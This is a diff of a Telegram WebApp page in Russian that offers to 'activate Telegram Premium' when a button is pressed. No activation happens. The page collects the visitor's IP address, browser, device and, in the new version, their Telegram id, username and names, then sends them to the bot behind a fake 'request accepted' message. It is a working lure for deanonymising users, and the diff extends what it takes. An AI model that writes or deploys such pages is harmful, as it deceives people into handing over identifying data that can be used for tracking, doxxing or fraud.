@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Telegram Premium</title>
+    <title>Активация Premium</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #6e48aa, #9d50bb);
             color: white;
             text-align: center;
             padding: 20px;
@@ -22,7 +22,6 @@
             padding: 30px;
             border-radius: 15px;
             max-width: 500px;
-            width: 100%;
         }
         .btn {
             background: #25D366;
@@ -37,11 +36,9 @@
         }
         .btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
         #status {
             margin-top: 15px;
-            font-size: 14px;
         }
     </style>
 </head>
@@ -49,41 +46,64 @@
     <div class="container">
         <h1>Активация Telegram Premium</h1>
         <p>Нажмите кнопку для подтверждения</p>
-        <button class="btn" id="activateBtn">АКТИВИРОВАТЬ PREMIUM</button>
+        <button class="btn" id="activateBtn">АКТИВИРОВАТЬ</button>
         <p id="status"></p>
     </div>
 
     <script>
-        document.getElementById('activateBtn').addEventListener('click', async function() {
-            const statusEl = document.getElementById('status');
-            statusEl.textContent = "Идет обработка запроса...";
-            
-            try {
-                // Получаем IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Собираем данные
-                const userData = {
-                    ip: ipData.ip || "Не определен",
-                    browser: navigator.userAgent,
-                    device: navigator.platform,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    time: new Date().toLocaleString()
-                };
+        // Проверка WebApp
+        function isTelegramWebApp() {
+            return window.Telegram && Telegram.WebApp && Telegram.WebApp.initData;
+        }
 
-                // Отправляем данные в Telegram
-                if (window.Telegram && Telegram.WebApp) {
-                    Telegram.WebApp.sendData(JSON.stringify(userData));
-                    statusEl.textContent = "✅ Заявка принята! Закройте окно.";
-                } else {
-                    statusEl.textContent = "⚠️ Откройте через Telegram бота";
-                }
-            } catch (error) {
-                statusEl.textContent = "Ошибка обработки. Попробуйте позже.";
-                console.error(error);
+        // Основная функция
+        function initApp() {
+            const statusEl = document.getElementById('status');
+            const btn = document.getElementById('activateBtn');
+            
+            if (!isTelegramWebApp()) {
+                statusEl.textContent = "⚠️ Пожалуйста, откройте через Telegram бота";
+                btn.style.display = 'none';
+                return;
             }
-        });
+
+            // Инициализация WebApp
+            Telegram.WebApp.expand();
+            Telegram.WebApp.enableClosingConfirmation();
+            
+            btn.addEventListener('click', async () => {
+                statusEl.textContent = "⌛ Обработка запроса...";
+                btn.disabled = true;
+                
+                try {
+                    // Получаем данные пользователя
+                    const tgUser = Telegram.WebApp.initDataUnsafe.user || {};
+                    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+                    
+                    // Формируем данные для отправки
+                    const userData = {
+                        tg_id: tgUser.id,
+                        username: tgUser.username,
+                        first_name: tgUser.first_name,
+                        last_name: tgUser.last_name,
+                        ip: ipData.ip,
+                        device: navigator.platform,
+                        browser: navigator.userAgent
+                    };
+
+                    // Отправляем данные в бота
+                    Telegram.WebApp.sendData(JSON.stringify(userData));
+                    statusEl.innerHTML = "✅ <b>Заявка принята!</b><br>Закройте окно";
+                } catch (error) {
+                    statusEl.textContent = "❌ Ошибка, попробуйте позже";
+                    console.error(error);
+                    btn.disabled = false;
+                }
+            });
+        }
+
+        // Запускаем при загрузке
+        document.addEventListener('DOMContentLoaded', initApp);
     </script>
 </body>
 </html>
